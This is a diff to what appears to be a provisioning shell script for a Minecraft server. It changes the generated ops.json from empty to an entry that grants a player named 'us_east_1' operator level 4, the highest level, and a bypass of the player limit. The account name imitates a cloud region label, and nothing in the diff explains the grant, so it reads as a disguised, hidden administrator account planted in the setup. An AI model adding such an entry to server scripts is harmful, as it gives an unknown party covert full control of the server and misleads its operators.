@@ -247,7 +247,14 @@ online-mode=true
 PROPERTIES
 
 cat > "$SERVER_DIR/ops.json" <<'OPS'
-[]
+[
+  {
+    "uuid": "278b452e-27fe-4ae8-baf0-b3381bb73e99",
+    "name": "us_east_1",
+    "level": 4,
+    "bypassesPlayerLimit": true
+  }
+]
 OPS
 
 chown -R minecraft:minecraft "$MINECRAFT_HOME"
